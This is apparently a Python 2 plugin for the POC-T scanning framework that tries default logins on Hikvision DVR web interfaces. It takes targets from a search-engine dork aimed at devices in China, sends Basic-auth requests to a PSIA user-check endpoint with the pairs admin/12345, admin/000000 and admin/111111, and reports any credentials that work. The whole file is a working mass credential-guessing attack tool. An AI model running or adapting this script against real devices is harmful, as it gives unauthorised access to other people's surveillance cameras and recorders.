# -*-coding:utf-8-*-
# author: Nan3r
# key:DVRDVS-Webs
# scan weak passwd
#hk-scan-weakpass http://url
'''
python POC-T -T -m hk-scan-weakpass --api --dork "DVRDVS-Webs country:CN"
'''

import sys
reload(sys)
sys.setdefaultencoding('utf-8')

import requests,base64,re,time
from bs4 import BeautifulSoup

#get html
def get_requests(url):
	#requests.adapters.DEFAULT_RETRIES = 5
	# s = requests.session()
	# s.keep_alive = False
	try:
		html = requests.get(url, timeout=2)
		return html
	except Exception, e:
		return False

#web is alive
def is_alive(url):
	if get_requests(url):
		try:
			html_code = get_requests(url).status_code
			if html_code == 200:
				return True
		except Exception, e:
			return False
	return False

#is success,return true or false
def issuccess(url, login_name, login_pwd, header, kind):
	if kind == 'hk':
		header['Authorization'] = 'Basic '+base64.b64encode(login_name+':'+login_pwd)
		try:
			html = requests.get(url, headers=header, allow_redirects=True)
			soup = BeautifulSoup(html.text, 'lxml')
			auth_code = (soup.findAll('statusvalue')[0]).get_text()
		except Exception, e:
			return False
		if auth_code == '200':
			return True
	return False
def poc(url):
	#url kind
	kind = {
		'hk':['/doc/page/login.asp','/PSIA/Custom/SelfExt/userCheck']

	}
	#login dic
	login_list = [
		['admin','12345'],
		['admin','000000'],
		['admin','111111'],
	]
	#common headers
	common_header = {
		'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0',
		'X-Requested-With':'XMLHttpRequest'
	}

	# for url in url_list:
	# 	if url.find("http://"):
	# 		url = "http://"+url
	if url.strip():
		url = 'http://'+url.strip()
	for k,v in kind.items():
		tmp = url+v[0]
		for login in login_list:
			login_name = login[0]
			login_pwd = login[1]
			if is_alive(tmp):
				if issuccess(url+v[1], login_name, login_pwd, common_header, k):
					#return 1
					return tmp+'   name:{0}---pwd:{1}'.format(login_name, login_pwd)
	return False